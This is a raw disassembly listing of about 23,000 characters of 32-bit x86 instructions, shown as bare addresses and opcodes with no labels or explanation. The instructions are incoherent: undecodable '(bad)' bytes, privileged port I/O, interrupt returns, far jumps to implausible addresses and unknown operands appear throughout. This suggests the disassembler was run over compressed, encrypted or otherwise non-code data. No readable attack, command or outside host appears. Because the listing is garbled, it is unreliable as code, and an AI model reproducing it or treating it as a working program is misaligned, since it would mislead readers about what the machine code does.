  423c92:	rcl    BYTE PTR [ebp-0x61e6320c],0xe3
  423c99:	repz (bad) 
  423c9b:	and    edx,edx
  423c9d:	mov    bl,0xd4
  423c9f:	jns    0x423d0b
  423ca1:	out    dx,eax
  423ca2:	ins    DWORD PTR es:[edi],dx
  423ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ca4:	jo     0x423c64
  423ca6:	cmp    cl,dl
  423ca8:	cdq    
  423ca9:	mov    al,0x69
  423cab:	push   edx
  423cac:	lock jo 0x423cda
  423caf:	inc    esi
  423cb0:	push   esp
  423cb1:	stc    
  423cb2:	mov    eax,DWORD PTR [esi+0x4d]
  423cb5:	sbb    al,0xfc
  423cb7:	sub    eax,0xaa7b2b99
  423cbc:	jns    0x423c6d
  423cbe:	ja     0x423cd6
  423cc0:	xor    edi,DWORD PTR es:[eax-0x2237c070]
  423cc7:	les    ebx,FWORD PTR [esi-0x6fb0f7f7]
  423ccd:	xchg   ecx,eax
  423cce:	mov    ds:0xe87c1652,al
  423cd3:	xchg   esi,eax
  423cd4:	sub    eax,0x6be08b4a
  423cd9:	fld    TBYTE PTR [esi-0x2f6f2b66]
  423cdf:	es push es
  423ce1:	push   esp
  423ce2:	pop    esi
  423ce3:	enter  0x9864,0xf
  423ce7:	push   0xffffffa1
  423ce9:	arpl   cx,si
  423ceb:	js     0x423d15
  423ced:	push   ebp
  423cee:	iret   
  423cef:	push   edi
  423cf0:	nop
  423cf1:	mov    dl,0xb7
  423cf3:	clc    
  423cf4:	scas   al,BYTE PTR es:[edi]
  423cf5:	adc    esi,esi
  423cf7:	mov    BYTE PTR [esi],al
  423cf9:	xor    eax,0xa0733a9b
  423cfe:	mov    al,ds:0xa5b5f07f
  423d03:	shl    eax,0x26
  423d06:	jne    0x423cf6
  423d08:	sub    BYTE PTR [edi+0x4e6539e6],al
  423d0e:	and    BYTE PTR [esi+edx*1],0x36
  423d12:	sti    
  423d13:	(bad)  
  423d14:	mov    BYTE PTR [eax],dh
  423d16:	in     al,0xb8
  423d18:	lahf   
  423d19:	mov    eax,0x85488733
  423d1e:	rol    BYTE PTR [ebx],cl
  423d20:	push   ss
  423d21:	bound  ebx,QWORD PTR [edi-0x7a]
  423d24:	scas   al,BYTE PTR es:[edi]
  423d25:	sub    ah,BYTE PTR [edx]
  423d27:	fcom   QWORD PTR [eax-0x3e136dd7]
  423d2d:	mov    BYTE PTR [edi+0x4f],ch
  423d30:	push   ds
  423d31:	div    BYTE PTR [ebp-0x7]
  423d34:	and    eax,0xe88117f1
  423d39:	mov    ds:0x5dcc90ae,al
  423d3e:	stos   BYTE PTR es:[edi],al
  423d3f:	int3   
  423d40:	mov    esi,0x27e8c064
  423d45:	cmp    eax,0x2504036d
  423d4a:	popf   
  423d4b:	sbb    bl,dl
  423d4d:	or     esp,0x75
  423d50:	add    eax,0xde35ee9a
  423d55:	ins    DWORD PTR es:[edi],dx
  423d56:	mov    edi,0xcdfe2dec
  423d5b:	sub    ch,al
  423d5d:	lock mov bl,0xe6
  423d60:	lahf   
  423d61:	int    0xed
  423d63:	mov    ds:0x36d14c8e,ax
  423d69:	imul   edx,esi,0xf390208c
  423d6f:	xchg   ebp,eax
  423d71:	mov    ah,0x69
  423d73:	outs   dx,DWORD PTR ds:[esi]
  423d74:	pop    edx
  423d75:	pop    esp
  423d76:	aad    0xd0
  423d78:	or     eax,0x2af2ee64
  423d7d:	xor    dh,BYTE PTR [ecx+0x5d974264]
  423d83:	pop    ebp
  423d84:	sbb    dl,dh
  423d86:	push   cs
  423d87:	sub    cl,ah
  423d89:	and    ebp,DWORD PTR [edx-0x32a3696c]
  423d8f:	cmp    edi,DWORD PTR [eax]
  423d91:	lock fist DWORD PTR [ebx]
  423d94:	xchg   ebx,eax
  423d95:	pop    edx
  423d96:	xchg   ebp,eax
  423d97:	popf   
  423d98:	scas   eax,DWORD PTR es:[edi]
  423d99:	ret    
  423d9a:	fwait
  423d9b:	(bad)
  423d9f:	lds    edi,FWORD PTR [eax+0x5731b18b]
  423da5:	jno    0x423d85
  423da7:	xchg   ebx,eax
  423da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da9:	xor    ebp,DWORD PTR [esi-0x53]
  423dac:	mov    es,ebp
  423dae:	xor    esi,DWORD PTR [edi]
  423db0:	jmp    0x7a82d910
  423db5:	mov    ebx,0x5834d7f0
  423dba:	and    eax,0xc29c5315
  423dc0:	and    ah,dl
  423dc2:	in     al,dx
  423dc3:	(bad)  
  423dc4:	pop    ebp
  423dc5:	mov    cl,0x7e
  423dc7:	add    bl,BYTE PTR [eax-0x6d]
  423dca:	jbe    0x423e14
  423dcc:	loopne 0x423daa
  423dce:	int3   
  423dcf:	xchg   edx,eax
  423dd0:	and    DWORD PTR [eax+0x3d],edi
  423dd3:	fadd   QWORD PTR [ebx]
  423dd5:	cs test eax,0x82f9b4b5
  423ddb:	es inc ebx
  423ddd:	scas   al,BYTE PTR es:[edi]
  423dde:	test   BYTE PTR [edx+0x7d3fd427],bl
  423de4:	xor    esp,DWORD PTR [ebx+0x7e]
  423de7:	retf   
  423de8:	xchg   esp,eax
  423de9:	inc    esi
  423dea:	xchg   ecx,eax
  423deb:	fld    DWORD PTR [ecx+0x5d525a57]
  423df1:	ds jne 0x423dc5
  423df4:	mov    bl,0x1b
  423df6:	inc    ecx
  423df7:	pop    es
  423df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423df9:	jae    0x423dd0
  423dfb:	add    BYTE PTR [eax-0x1cd4b50f],dl
  423e01:	rol    DWORD PTR [ebp-0x63253aba],cl
  423e07:	sub    DWORD PTR es:0x93d4bace,ebx
  423e0e:	fadd   st(4),st
  423e10:	std    
  423e11:	or     ebp,ebp
  423e13:	lea    ebp,[esi]
  423e15:	jp     0x423d97
  423e17:	sbb    BYTE PTR [ecx-0x40],al
  423e1a:	add    bh,BYTE PTR [edx]
  423e1c:	push   0xc95e7638
  423e21:	mov    ch,bl
  423e23:	xlat   BYTE PTR ds:[ebx]
  423e24:	xchg   esi,eax
  423e25:	cwde   
  423e26:	shr    BYTE PTR [ebp+edi*8+0x2d],cl
  423e2a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  423e2c:	das    
  423e2d:	jl     0x423e45
  423e2f:	or     DWORD PTR ss:[edx+esi*1+0x5e300d3b],edx
  423e37:	fist   DWORD PTR [edx+edx*1]
  423e3a:	sub    DWORD PTR [ebp+0x16],ebp
  423e3d:	fild   QWORD PTR [ebp+0x9]
  423e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e41:	scas   al,BYTE PTR es:[edi]
  423e42:	jmp    0x423e14
  423e44:	retf   
  423e45:	or     al,al
  423e47:	and    al,0xc7
  423e49:	xchg   esp,eax
  423e4a:	or     ecx,0xffffffb3
  423e4d:	js     0x423e1d
  423e4f:	arpl   WORD PTR [eax-0x22],si
  423e52:	fdiv   QWORD PTR [ecx+eax*8-0x11]
  423e56:	outs   dx,BYTE PTR ss:[esi]
  423e58:	fldcw  WORD PTR [ecx+ebp*8+0x57]
  423e5c:	sbb    esi,esi
  423e5e:	push   ss
  423e5f:	jo     0x423e15
  423e61:	retf   
  423e62:	or     eax,0x5095dcad
  423e67:	rcl    DWORD PTR ds:0x7e17e1c1,cl
  423e6d:	lahf   
  423e6e:	mov    WORD PTR [ecx+0x17],fs
  423e71:	(bad)
  423e74:	dec    edi
  423e75:	lea    ebp,[esi+0x27c8b7d9]
  423e7b:	jmp    0x69202a3
  423e80:	scas   eax,DWORD PTR es:[edi]
  423e81:	imul   ebx,DWORD PTR [eax-0x25],0xffffffed
  423e85:	fiadd  DWORD PTR [edx]
  423e87:	test   BYTE PTR [ebx],dl
  423e89:	and    BYTE PTR [edx-0x7e4f6115],cl
  423e8f:	rcr    DWORD PTR [esi+0x5448090c],0x3a
  423e96:	shl    DWORD PTR [ebp+0x43],0x82
  423e9a:	pop    ss
  423e9b:	not    BYTE PTR [ecx]
  423e9d:	mov    BYTE PTR [ecx-0x2],dl
  423ea0:	mov    eax,ds:0xa0a569d6
  423ea5:	je     0x423ebf
  423ea7:	mov    cl,0xe1
  423ea9:	cwde   
  423eaa:	sbb    esp,eax
  423eac:	jge    0x423e44
  423eae:	repz shl DWORD PTR [edx-0x212a57cb],0x82
  423eb6:	push   esi
  423eb7:	enter  0x495d,0x15
  423ebb:	fdivr  QWORD PTR [ebp+eax*8-0x9e7c479]
  423ec2:	shr    BYTE PTR [esi+0x56],cl
  423ec5:	pop    esp
  423ec6:	lds    esi,FWORD PTR es:[eax]
  423ec9:	clc    
  423eca:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ecc:	mov    ds:0x996203e8,eax
  423ed1:	imul   ecx,esp,0xffffffd9
  423ed4:	lods   al,BYTE PTR ds:[esi]
  423ed5:	dec    ebp
  423ed6:	(bad)  
  423ed7:	pushf  
  423ed8:	loopne 0x423efb
  423eda:	and    BYTE PTR ds:0x541d05ef,al
  423ee0:	sbb    al,0x7e
  423ee2:	mov    ah,cl
  423ee4:	in     eax,0x24
  423ee6:	ret    0xb5
  423ee9:	retf   
  423eea:	xchg   esi,eax
  423eeb:	inc    ebx
  423eec:	test   DWORD PTR [eax-0x47],0x82eb6509
  423ef3:	inc    edx
  423ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ef5:	out    0xc,eax
  423ef7:	sbb    BYTE PTR [ecx+0x2657e67c],ch
  423efd:	and    eax,0x1bd37eec
  423f02:	loop   0x423f4d
  423f04:	inc    eax
  423f05:	gs add al,0x53
  423f08:	es aad 0x1
  423f0b:	pop    ds
  423f0c:	pop    ecx
  423f0d:	shl    BYTE PTR [ebx+ebx*1+0x13e5ca41],0x34
  423f15:	call   0xa79:0x3dc77e4
  423f1c:	aad    0x27
  423f1e:	dec    eax
  423f1f:	push   eax
  423f20:	(bad)  
  423f21:	cmp    eax,0xaaa42998
  423f26:	adc    al,0xc6
  423f28:	mov    WORD PTR [ebx+0x12],es
  423f2b:	out    0x95,al
  423f2d:	in     eax,dx
  423f2e:	inc    edi
  423f2f:	mov    bl,0x2f
  423f31:	push   ds
  423f32:	popf   
  423f33:	sti    
  423f34:	(bad)  
  423f35:	loope  0x423ec9
  423f37:	jecxz  0x423f7f
  423f39:	call   0x1878b143
  423f3e:	xor    cl,BYTE PTR [eax]
  423f40:	clc    
  423f41:	adc    esp,ebp
  423f43:	icebp  
  423f44:	adc    eax,DWORD PTR [eax+esi*1-0x5d]
  423f48:	cmp    ecx,ebp
  423f4a:	repnz cs scas eax,DWORD PTR es:[edi]
  423f4d:	sahf   
  423f4e:	pop    eax
  423f4f:	push   ecx
  423f50:	imul   ebp,DWORD PTR [edx-0x4b],0xffffff89
  423f54:	mov    al,ds:0x47dbadcc
  423f59:	into   
  423f5a:	pop    ebp
  423f5b:	and    esi,DWORD PTR [ebp-0x4af7a9b6]
  423f61:	dec    esp
  423f62:	out    dx,eax
  423f63:	inc    esp
  423f64:	add    al,0x63
  423f66:	mov    eax,ds:0x4a3edef3
  423f6b:	sub    ah,BYTE PTR ds:0x5108757f
  423f71:	dec    edi
  423f72:	sub    ebx,eax
  423f74:	repz jl 0x423f9b
  423f77:	dec    ebx
  423f78:	mov    bl,0x5a
  423f7a:	dec    edx
  423f7b:	inc    esi
  423f7c:	and    eax,0xf484cf44
  423f81:	arpl   WORD PTR ds:[esi-0x38696e9c],cx
  423f88:	xor    eax,DWORD PTR [ebx+0x2f]
  423f8b:	retf   
  423f8c:	in     al,0xa1
  423f8e:	ds sbb al,0x1a
  423f91:	(bad)  
  423f92:	jecxz  0x423f3e
  423f94:	test   eax,0xc02aee64
  423f99:	(bad)  
  423f9b:	repnz retf 
  423f9d:	mul    DWORD PTR [edi+0x38fdc977]
  423fa3:	out    0xb7,eax
  423fa5:	mov    ah,0x66
  423fa7:	push   es
  423fa8:	push   cs
  423fa9:	dec    ecx
  423faa:	and    DWORD PTR gs:[ebp-0x31],esi
  423fae:	shr    BYTE PTR [eax+edi*2],cl
  423fb1:	xchg   esp,eax
  423fb2:	popa   
  423fb3:	xchg   ebp,eax
  423fb4:	sbb    BYTE PTR [ebp-0x5fc95bd9],bh
  423fba:	pop    ecx
  423fbb:	jmp    0x2b26c43e
  423fc0:	(bad)  
  423fc1:	cmp    DWORD PTR ds:0xf1660734,edi
  423fc7:	sbb    esp,DWORD PTR [esi]
  423fc9:	jmp    0xcc2a:0xdcd5242c
  423fd0:	bound  esp,QWORD PTR [ebx+esi*4]
  423fd3:	and    BYTE PTR [edx],0x4e
  423fd6:	icebp  
  423fd7:	xchg   ecx,eax
  423fd8:	fidivr DWORD PTR [ecx+0x20802ef2]
  423fde:	cmp    BYTE PTR [edx],0x8f
  423fe1:	out    dx,eax
  423fe2:	pop    ecx
  423fe3:	mov    cl,0x24
  423fe5:	add    dl,BYTE PTR [edx]
  423fe7:	(bad)  
  423fe8:	mov    bl,0x10
  423fea:	fwait
  423feb:	xchg   BYTE PTR gs:[ecx-0x2],ch
  423fef:	loope  0x423f86
  423ff1:	pop    ss
  423ff2:	in     eax,dx
  423ff3:	out    0x61,eax
  423ff5:	inc    edi
  423ff6:	or     eax,ebx
  423ff8:	idiv   edx
  423ffa:	mov    cs:0x7bd10851,eax
  424000:	leave  
  424001:	cdq    
  424002:	scas   eax,DWORD PTR es:[edi]
  424003:	mov    ds:0x461a4bb,al
  424009:	mov    esp,0x238e59b9
  42400e:	imul   edi,edx,0x72
  424011:	in     al,0x22
  424013:	and    dh,BYTE PTR [esi]
  424015:	mov    DWORD PTR [edx],0x99cbb94
  42401b:	dec    esp
  42401c:	add    DWORD PTR [edx-0x1fa10df3],esp
  424022:	retf   0x8c96
  424025:	clc    
  424026:	cmp    eax,0x29b88b1f
  42402b:	pop    ds
  42402c:	das    
  42402d:	or     DWORD PTR [esi+0x29bbb284],esi
  424033:	pop    esp
  424034:	retf   0x7a70
  424037:	cmp    esp,DWORD PTR [ebp+0x6185d8d8]
  42403d:	add    eax,ecx
  42403f:	and    eax,0x9cbd8e2a
  424044:	adc    DWORD PTR [edi+0x27],ecx
  424047:	pop    edi
  424048:	fidivr WORD PTR [ebx]
  42404a:	aad    0xb5
  42404c:	jne    0x4240cd
  42404e:	repnz push ebx
  424050:	and    eax,DWORD PTR [ebp+0x2b2f0b8b]
  424056:	imul   ebx,DWORD PTR [eax+0x1c524584],0x59
  42405d:	adc    eax,0x3a6af050
  424062:	mov    dl,BYTE PTR [ebx-0x42]
  424065:	shl    BYTE PTR ds:0xf6552f52,1
  42406b:	adc    DWORD PTR [edi],ebx
  42406d:	sbb    eax,0xbc5f789e
  424072:	or     eax,DWORD PTR [edi]
  424074:	xchg   BYTE PTR [ecx+0x60],dl
  424077:	(bad)  
  424078:	mov    ch,0xad
  42407a:	sbb    dh,al
  42407c:	jge    0x424079
  42407e:	jmp    0x8c25c852
  424083:	adc    BYTE PTR [eax+ecx*1-0x7b],dh
  424087:	dec    edi
  424088:	sbb    eax,edx
  42408a:	jl     0x4240c5
  42408c:	jl     0x4240a7
  42408e:	xor    bl,BYTE PTR [esi-0x46]
  424091:	test   eax,0xbd7d928e
  424096:	jns    0x42405e
  424098:	dec    DWORD PTR ds:0x9b84bcfd
  42409e:	stc    
  42409f:	mov    eax,0x71e265c1
  4240a4:	cmp    eax,0xd6feb632
  4240a9:	sbb    DWORD PTR [ebx+0xc],0xbcda14cd
  4240b0:	dec    edx
  4240b1:	cs mov edi,0x3a41e154
  4240b7:	mov    es,WORD PTR [ebp+0x67]
  4240ba:	lods   al,BYTE PTR ds:[esi]
  4240bb:	mov    eax,ds:0xfaccdc37
  4240c0:	enter  0xe8b7,0xcf
  4240c4:	mov    fs,edx
  4240c6:	mov    esp,0xc6c64d64
  4240cb:	sub    al,0xd6
  4240cd:	mov    ebp,0x4c7029ef
  4240d2:	dec    esi
  4240d3:	in     al,0xc5
  4240d5:	jne    0x4240bc
  4240d7:	add    eax,0xaed8bd92
  4240dc:	push   esi
  4240dd:	ins    BYTE PTR es:[edi],dx
  4240de:	(bad)  
  4240df:	cmp    eax,DWORD PTR [edx]
  4240e1:	bound  esi,QWORD PTR [edx-0x7bdb799a]
  4240e7:	xor    BYTE PTR [edx-0x56],bh
  4240ea:	stos   DWORD PTR es:[edi],eax
  4240eb:	sbb    ebp,eax
  4240ed:	(bad)  
  4240ee:	dec    ebx
  4240ef:	dec    ebp
  4240f0:	lods   al,BYTE PTR ds:[esi]
  4240f1:	adc    al,0x81
  4240f3:	push   edx
  4240f4:	bound  edi,QWORD PTR [eax+ebx*8+0x65]
  4240f8:	std    
  4240f9:	(bad)  
  4240fa:	mov    gs,WORD PTR ds:0x3bfbcdc
  424100:	push   edi
  424101:	test   BYTE PTR [ebp+0x44960131],bh
  424107:	fldcw  WORD PTR [esp+ecx*4-0xd]
  42410b:	loope  0x424119
  42410d:	daa    
  42410e:	cmp    al,0x13
  424110:	jo     0x4240ed
  424112:	mov    ecx,0x3566a085
  424117:	ja     0x42418b
  424119:	mov    ecx,ecx
  42411b:	dec    esp
  42411c:	retf   0x527c
  42411f:	pop    es
  424120:	mov    ebp,0x3627cbf5
  424125:	jns    0x4240e4
  424127:	adc    DWORD PTR [eax-0xf8d38bd],ebx
  42412d:	push   0x8dafc01f
  424132:	lods   al,BYTE PTR ds:[esi]
  424133:	ror    BYTE PTR [esi],cl
  424135:	cmc    
  424136:	push   eax
  424137:	int    0xe3
  424139:	dec    esi
  42413a:	loope  0x424130
  42413c:	add    edi,DWORD PTR [eax-0x633b9ee7]
  424142:	push   edi
  424143:	adc    ebx,DWORD PTR [ecx-0x17]
  424146:	pop    ds
  424147:	push   ds
  424148:	jno    0x4241ad
  42414a:	sub    edx,DWORD PTR [edx]
  42414c:	and    DWORD PTR [ebx-0x3e954da8],esp
  424152:	inc    edx
  424153:	adc    eax,0xa8c9cb32
  424158:	xor    ah,0xfd
  42415b:	push   es
  42415c:	fistp  QWORD PTR [edi-0x63]
  42415f:	out    dx,eax
  424160:	sub    bl,BYTE PTR [ecx+0x21]
  424163:	xchg   esp,eax
  424164:	enter  0x21a0,0xd0
  424168:	jnp    0x4241c9
  42416a:	and    ch,BYTE PTR [ebx+0x3]
  42416d:	inc    ebp
  42416e:	inc    ecx
  42416f:	sahf   
  424170:	lahf   
  424171:	rcr    ebx,cl
  424173:	loopne 0x4241ce
  424175:	rcl    DWORD PTR [esi],cl
  424177:	lea    edi,[ecx+0x5a]
  42417a:	loop   0x4241f5
  42417c:	into   
  42417d:	mov    ecx,0x48667a9
  424182:	cld    
  424183:	lea    ebx,[ebx+0xaf4af70]
  424189:	int    0x73
  42418b:	imul   ebx,DWORD PTR [esi-0x2cf89a05],0x4f
  424192:	pushf  
  424193:	js     0x424196
  424195:	nop
  424196:	ss shl ch,1
  424199:	xchg   ebp,eax
  42419a:	adc    al,0xd5
  42419c:	and    edi,DWORD PTR [ebp-0x27664c70]
  4241a2:	scas   eax,DWORD PTR es:[edi]
  4241a3:	rol    BYTE PTR [esi+esi*8-0xbb3564],0x5e
  4241ab:	outs   dx,BYTE PTR ds:[esi]
  4241ac:	scas   al,BYTE PTR es:[edi]
  4241ad:	xchg   edx,eax
  4241ae:	jo     0x4241a9
  4241b0:	test   DWORD PTR [ecx+0x299512a],ebp
  4241b6:	mov    al,0x46
  4241b8:	loop   0x424210
  4241ba:	add    BYTE PTR [edi],bh
  4241bc:	in     eax,0xca
  4241be:	adc    ecx,DWORD PTR [eax]
  4241c0:	fiadd  DWORD PTR [esi-0x3d8affdc]
  4241c6:	jl     0x424192
  4241c8:	out    0xb5,al
  4241ca:	and    BYTE PTR [ebx],al
  4241cc:	in     al,dx
  4241cd:	push   ds
  4241ce:	cmp    eax,0x5aed6ed2
  4241d3:	push   ds
  4241d4:	and    DWORD PTR [edx+0x5a],esi
  4241d7:	es and eax,0xb534ddce
  4241dd:	inc    edx
  4241de:	cs push 0xb76fb50
  4241e4:	jno    0x4241b3
  4241e6:	cmp    eax,0x75a1b048
  4241eb:	clc    
  4241ec:	and    al,0xd5
  4241ee:	mov    bh,0xfc
  4241f0:	fldenv [ebx-0x5ed2c885]
  4241f6:	cs lock pop esi
  4241f9:	jcxz   0x42425f
  4241fc:	int3   
  4241fd:	repz popf 
  4241ff:	mov    edi,0xc4a983a3
  424204:	mov    esi,ecx
  424206:	imul   edx,DWORD PTR [eax],0xffffffd9
  424209:	(bad)  
  42420a:	pop    ebx
  42420b:	lea    edi,[edi]
  42420d:	cmp    BYTE PTR [eax-0x2547c70b],bh
  424213:	push   esi
  424214:	outs   dx,BYTE PTR ds:[esi]
  424215:	mov    dh,0x7b
  424217:	fwait
  424218:	xchg   ebp,eax
  424219:	push   ss
  42421a:	sub    edi,edi
  42421c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42421d:	mov    WORD PTR [ebp-0x64661a74],?
  424223:	xchg   BYTE PTR [edi],bl
  424225:	(bad)  
  424226:	mov    ebx,es
  424228:	add    al,0x3b
  42422a:	dec    edx
  42422b:	jp     0x42423e
  42422d:	mov    ds:0xec042ea1,eax
  424232:	pop    esi
  424233:	jno    0x424282
  424235:	jl     0x424296
  424237:	pop    ebx
  424238:	mov    esi,0x99f8000a
  42423d:	mov    edi,0xb78d026c
  424242:	push   edi
  424243:	cdq    
  424244:	test   eax,0x806d4eb3
  424249:	dec    ebp
  42424a:	mov    bl,0xd7
  42424c:	fcomp  QWORD PTR [ecx-0x3f312931]
  424252:	xor    DWORD PTR [ebp+0x57],0x29978971
  424259:	(bad)  
  42425a:	(bad)  
  42425b:	or     esi,DWORD PTR [esi+0x21]
  42425e:	push   esi
  42425f:	pop    esi
  424260:	inc    edx
  424261:	mov    DWORD PTR [ecx+0x3fe4ad9e],ecx
  424267:	stos   BYTE PTR es:[edi],al
  424268:	mov    bl,BYTE PTR [ebp-0x49]
  42426b:	lds    edx,FWORD PTR [edx]
  42426d:	cmp    al,0xf0
  42426f:	mov    bl,0x91
  424271:	out    0x25,eax
  424273:	test   eax,0x187dc613
  424278:	rcr    BYTE PTR [ebx],cl
  42427a:	sbb    edx,DWORD PTR [esi]
  42427c:	pop    ds
  42427d:	sub    ah,BYTE PTR [edi-0x46358ec5]
  424283:	es mov edi,0xe918b8f0
  424289:	in     eax,dx
  42428a:	pop    ss
  42428b:	js     0x424212
  42428d:	mov    cl,0x5d
  42428f:	(bad)  
  424290:	ds push cs
  424292:	es xchg edx,eax
  424294:	in     eax,0xcb
  424296:	lock push ss
  424298:	jne    0x4242bc
  42429a:	(bad)  
  42429b:	adc    cl,ch
  42429d:	imul   ebp,DWORD PTR [ecx],0xffffffdc
  4242a0:	into   
  4242a1:	test   eax,0x2352f4a6
  4242a6:	adc    al,0x4c
  4242a8:	pop    eax
  4242a9:	mov    ecx,0xd92847e4
  4242ae:	sub    DWORD PTR [edx],edi
  4242b0:	pop    ebp
  4242b1:	std    
  4242b2:	pop    es
  4242b3:	push   eax
  4242b4:	mov    edx,eax
  4242b6:	test   eax,0xa9970454
  4242bb:	xor    eax,0x927ce165
  4242c0:	(bad)  
  4242c1:	in     eax,0xf
  4242c3:	sbb    ebp,esi
  4242c5:	hlt    
  4242c6:	push   ds
  4242c7:	sub    dh,bh
  4242c9:	in     eax,dx
  4242ca:	add    bl,bh
  4242cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242cd:	scas   eax,DWORD PTR es:[edi]
  4242ce:	mov    edx,0x821211fa
  4242d3:	pop    eax
  4242d4:	jo     0x424301
  4242d6:	adc    ah,cl
  4242d8:	int3   
  4242d9:	fs out dx,eax
  4242db:	push   edx
  4242dc:	and    al,BYTE PTR [esi+0x7b83ab67]
  4242e2:	pop    edx
  4242e3:	bound  ebp,QWORD PTR [ecx+0x1f]
  4242e6:	pop    ds
  4242e7:	mov    ebx,DWORD PTR [ecx+0x81be61f]
  4242ed:	dec    edx
  4242ee:	mov    ecx,0xda865e42
  4242f3:	xchg   ebp,eax
  4242f4:	(bad)  
  4242f5:	shl    BYTE PTR [ebx+eax*4],0xb2
  4242f9:	test   BYTE PTR [ebp-0x16029114],bl
  4242ff:	(bad)  
  424300:	xor    eax,0x4c737b9f
  424305:	and    al,0x2b
  424307:	test   BYTE PTR [eax-0x260544c5],0x45
  42430e:	sbb    al,0xb7
  424310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424311:	jecxz  0x424344
  424313:	cli    
  424314:	mul    DWORD PTR [edi+0x25]
  424317:	pop    ss
  424318:	out    0xe6,al
  42431a:	test   BYTE PTR [eax-0x3e7255ba],ch
  424320:	mov    esi,0x60b7a478
  424325:	aaa    
  424326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424327:	(bad)  
  424328:	push   cs
  424329:	push   ebp
  42432a:	push   es
  42432b:	ins    DWORD PTR es:[edi],dx
  42432c:	dec    ah
  42432e:	and    esi,DWORD PTR [esi+0x4e]
  424331:	mov    bl,0xf0
  424333:	out    dx,eax
  424334:	mov    dh,0x66
  424336:	cmp    DWORD PTR [ebp+ebp*4+0x1b],esp
  42433a:	sbb    BYTE PTR [ebp-0x1f],0x15
  42433e:	push   cs
  42433f:	push   0x76
  424341:	in     al,0x16
  424343:	dec    esi
  424344:	ins    BYTE PTR es:[edi],dx
  424345:	inc    ebx
  424346:	pop    ebp
  424347:	sub    eax,0x3543d975
  42434c:	in     al,dx
  42434d:	mov    dl,0xdf
  42434f:	cdq    
  424350:	sbb    eax,0xfb320d72
  424355:	mov    ch,0x31
  424357:	cmp    ch,ch
  424359:	fist   WORD PTR [ebx+ebp*1-0x55d92d42]
  424360:	pop    ebx
  424361:	ds jle 0x424347
  424364:	outs   dx,DWORD PTR ds:[esi]
  424365:	dec    ebx
  424366:	iret   
  424367:	fdiv   st(6),st
  424369:	cld    
  42436a:	arpl   WORD PTR [edi],bp
  42436c:	jge    0x42433d
  42436e:	push   ebx
  42436f:	pop    ss
  424370:	(bad)  
  424371:	adc    BYTE PTR [eax+ecx*8+0x665856bb],cl
  424378:	clc    
  424379:	dec    eax
  42437a:	adc    bl,dl
  42437c:	adc    edx,ecx
  42437e:	xor    al,0xd8
  424380:	and    DWORD PTR [esi-0x2b],0x73
  424384:	xor    al,0xfd
  424386:	mov    esi,DWORD PTR [edx-0x1fb3cb1a]
  42438c:	xor    eax,0x2300e670
  424391:	dec    eax
  424392:	sub    eax,0x2d3fde63
  424397:	in     al,0xc4
  424399:	xchg   ecx,eax
  42439a:	and    BYTE PTR [ebp+eiz*2-0x49],bl
  42439e:	loopne 0x4243ff
  4243a0:	jne    0x42432b
  4243a2:	fidivr WORD PTR es:[eax+0x67c2a269]
  4243a9:	adc    DWORD PTR [ebx-0x4f],esp
  4243ac:	mov    ebx,0x35a8a399
  4243b1:	adc    eax,0x7792b58a
  4243b6:	enter  0x8828,0x7b
  4243ba:	popa   
  4243bb:	clc    
  4243bc:	cmp    dl,BYTE PTR [ecx+0x67]
  4243bf:	rcl    BYTE PTR [eax+0x6d],0x24
  4243c3:	jp     0x424354
  4243c5:	dec    ecx
  4243c6:	jne    0x4243dc
  4243c8:	scas   eax,DWORD PTR es:[edi]
  4243c9:	add    ah,BYTE PTR [edi+0x501d8b6e]
  4243cf:	out    dx,al
  4243d0:	inc    edx
  4243d1:	aam    0x4d
  4243d3:	cmp    ah,ah
  4243d5:	mov    dl,0x63
  4243d7:	xchg   esp,eax
  4243d8:	gs sbb al,0xd0
  4243db:	mov    esi,0x1cfe51dd
  4243e0:	mov    WORD PTR [ecx],cs
  4243e2:	xlat   BYTE PTR ss:[ebx]
  4243e4:	cwde   
  4243e5:	sub    DWORD PTR [edx-0x5621608e],ebp
  4243eb:	xchg   ebx,eax
  4243ec:	jecxz  0x424420
  4243ee:	inc    edx
  4243ef:	mov    ?,WORD PTR [edi+0x7c014e39]
  4243f5:	(bad)  
  4243f6:	test   eax,0xe2b51ac8
  4243fb:	ficom  DWORD PTR [esi]
  4243fd:	icebp  
  4243fe:	jp     0x424461
  424400:	xlat   BYTE PTR ds:[ebx]
  424401:	push   ecx
  424402:	cmp    BYTE PTR [ebp+0x42],bl
  424405:	cmp    DWORD PTR [esi-0x7e],edi
  424408:	cdq    
  424409:	repz imul esi,DWORD PTR [esi-0x72],0x762e1bd0
  424411:	mov    dh,0x39
  424413:	pop    ecx
  424414:	sbb    eax,0x86017336
  424419:	xchg   ebp,eax
  42441a:	pop    ebp
  42441b:	stos   DWORD PTR es:[edi],eax
  42441c:	pinsrw mm4,ebx,0x78
  424420:	jbe    0x424402
  424422:	sbb    ch,BYTE PTR [ecx+0x1c14e384]
  424428:	shl    ebx,1
  42442a:	mov    edx,0xa203f140
  42442f:	fsubr  st(2),st
  424431:	popf   
  424432:	ds fdivr st(2),st
  424435:	or     DWORD PTR [ebx+0x68],ebp
  424438:	(bad)  
  424439:	cmp    eax,0xa9662634
  42443e:	push   edi
  42443f:	adc    esi,DWORD PTR [edi]
  424441:	push   edx
  424442:	ror    DWORD PTR [ecx-0x51eb272c],cl
  424448:	push   ds
  424449:	sub    ah,BYTE PTR [ecx]
  42444b:	rcl    cl,cl
  42444d:	mov    dh,BYTE PTR [eax-0x5d7e1f41]
  424453:	xchg   esi,eax
  424454:	into   
  424455:	xchg   edx,eax
  424456:	sub    bh,BYTE PTR [edx+ecx*1]
  424459:	gs jmp 0x6f8f:0x5f3c0b4a
  424461:	pop    esp
  424462:	xchg   DWORD PTR [eax+0x1a9da551],esi
  424468:	mov    ch,0xec
  42446a:	pop    edx
  42446b:	pop    esi
  42446c:	loopne 0x424491
  42446e:	es ret 0x1323
  424472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
